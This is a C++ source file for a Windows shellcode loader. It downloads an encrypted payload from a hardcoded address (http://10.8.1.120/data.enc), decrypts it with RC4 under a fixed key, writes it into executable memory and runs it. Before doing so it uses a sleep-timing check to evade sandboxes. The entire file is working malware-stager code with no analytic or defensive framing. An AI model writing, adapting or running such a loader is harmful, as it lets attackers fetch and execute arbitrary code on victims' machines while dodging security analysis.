#include <iostream>
#include <fstream>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <cstring>
#include <chrono>
#include <thread>

#pragma comment(lib, "wininet.lib")

void RC4Decrypt(std::vector<char>& data, const std::string& key) {
    int keylen = key.size();
    unsigned char s[256];
    for (int i = 0; i < 256; ++i)
        s[i] = i;

    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + s[i] + key[i % keylen]) % 256;
        std::swap(s[i], s[j]);
    }

    int i = 0;
    j = 0;
    for (size_t n = 0; n < data.size(); ++n) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        std::swap(s[i], s[j]);
        data[n] ^= s[(s[i] + s[j]) % 256];
    }
}

std::vector<char> LoadRemoteData(const char* url) {
    std::vector<char> buffer;
    HINTERNET hInternet = InternetOpenA("rem_shc_ldr", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "Failed to connect" << std::endl;
        return buffer;
    }

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        std::cerr << "Failed to connect to URL." << std::endl;
        InternetCloseHandle(hInternet);
        return buffer;
    }

    char temp[4096];
    DWORD bytesRead;
    while (InternetReadFile(hConnect, temp, sizeof(temp), &bytesRead) && bytesRead) {
        buffer.insert(buffer.end(), temp, temp + bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return buffer;
}

void LoadData(const char* url) {
    std::vector<char> buffer = LoadRemoteData(url);
    if (buffer.empty()) {
        std::cerr << "Failed to load data from given URL." << std::endl;
        return;
    }

    // Decrypt data
    std::string key = "windows.h";
    RC4Decrypt(buffer, key);

    // Allocate executable memory
    void* exec = VirtualAlloc(nullptr, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec == nullptr) {
        std::cerr << "Failed to allocate executable memory." << std::endl;
        return;
    }

    // Copy data to executable memory
    std::memcpy(exec, buffer.data(), buffer.size());

    // Allocated memory to a function pointer
    void (*func)() = (void(*)())exec;

    // Call the data
    func();

    // Free the allocated memory
    VirtualFree(exec, 0, MEM_RELEASE);
}

int main() {
    auto start = std::chrono::system_clock::now();
    std::this_thread::sleep_for(std::chrono::seconds(5));
    auto end = std::chrono::system_clock::now();
    std::chrono::duration<double> elapsed_seconds = end - start;
    if (elapsed_seconds.count() <= 4.5) {
        exit(0);
    }

    const char* url = "http://10.8.1.120/data.enc";
    LoadData(url);
    return 0;
}
